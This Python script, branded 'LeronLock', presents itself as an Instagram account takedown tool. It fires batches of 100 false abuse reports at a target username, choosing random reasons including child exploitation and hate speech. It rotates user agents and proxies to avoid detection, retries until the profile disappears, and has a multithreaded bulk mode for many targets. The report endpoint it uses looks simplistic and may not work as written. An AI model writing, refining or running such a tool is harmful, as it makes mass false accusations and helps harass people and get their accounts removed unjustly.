import requests
import random
import time
from fake_useragent import UserAgent
from threading import Thread
from colorama import Fore, init
import logging
import concurrent.futures

# Proxy pool (You can add more proxies)
def get_proxy():
    proxies = [
        'http://proxy1.com', 
        'http://proxy2.com',
        'http://proxy3.com', 
        # Add more proxies here
    ]
    return random.choice(proxies)

# Generate random user-agent
def get_user_agent():
    ua = UserAgent()
    return ua.random

# Report reasons
def get_report_reasons():
    reasons = [
        "Spam", "Inappropriate story content", "Hate speech", 
        "Bullying", "Child exploitation", "Sharing personal information", 
        "Account is hacked"
    ]
    return reasons

# Advanced reporting function
def report_account(target_account, report_reason):
    url = f"https://www.instagram.com/{target_account}/"
    headers = {"User-Agent": get_user_agent(), "Referer": url}
    
    proxies = {'http': get_proxy()}
    
    data = {"report_reason": report_reason, "username": target_account}

    try:
        response = requests.post(f"https://www.instagram.com/report", data=data, headers=headers, proxies=proxies)
        if response.status_code == 200:
            logging.info(f"{target_account} successfully reported!")
            return True
        else:
            logging.warning(f"Error reporting {target_account}.")
            return False
    except Exception as e:
        logging.error(f"Error: {e}")
        return False

# Dynamic reporting process
def dynamic_reports(target_account):
    reasons = get_report_reasons()
    
    for i in range(100):  # Send 100 reports
        reason = random.choice(reasons)
        print(Fore.CYAN + f"[{i+1}/100] Sending report: {reason}")
        if not report_account(target_account, reason):
            print(Fore.YELLOW + "[!] Report failed, retrying.")
            break
        time.sleep(random.randint(1, 3))  # Wait between reports

# Check account status
def check_account_status(target_account):
    url = f"https://www.instagram.com/{target_account}/"
    headers = {"User-Agent": get_user_agent()}
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 404:
            print(Fore.GREEN + f"[✔] {target_account} is now closed!")
            return True
        else:
            print(Fore.RED + f"[✘] {target_account} is still active.")
            return False
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        return False

# Start the account shutdown attack
def start_attack(target_account):
    print(Fore.MAGENTA + "Target account is now being attacked...")
    attempts = 0
    while True:
        attempts += 1
        dynamic_reports(target_account)
        if check_account_status(target_account):
            print(Fore.GREEN + f"[✔] {target_account} has been successfully taken down!")
            break
        elif attempts >= 5:
            print(Fore.YELLOW + "[!] Maximum retry limit reached, stopping.")
            break
        else:
            print(Fore.YELLOW + "[!] Account still active, retrying...")
            time.sleep(random.randint(30, 60))  # Wait between attempts

# Bulk mode with multithreading
def start_bulk_attack(target_accounts):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(start_attack, target_accounts)

# User-friendly main menu
def menu():
    init(autoreset=True)
    print(Fore.YELLOW + "---------------------------------------------------")
    print(Fore.CYAN + "LeronLock v2000000 - Instagram Account Takedown Tool")
    print(Fore.CYAN + "[1] Start single account takedown")
    print(Fore.CYAN + "[2] Start multiple account takedown")
    print(Fore.CYAN + "[3] Exit")
    print(Fore.YELLOW + "---------------------------------------------------")
    
    choice = input(Fore.GREEN + "Enter a choice: ")
    return choice

# Main function
def main():
    while True:
        choice = menu()
        
        if choice == "1":
            target_account = input(Fore.YELLOW + "Enter the target username: ")
            start_attack(target_account)
        elif choice == "2":
            target_accounts = input(Fore.YELLOW + "Enter multiple usernames (comma-separated): ").split(',')
            start_bulk_attack([account.strip() for account in target_accounts])
        elif choice == "3":
            print(Fore.GREEN + "Exiting...")
            break
        else:
            print(Fore.RED + "[!] Invalid choice, please try again.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()
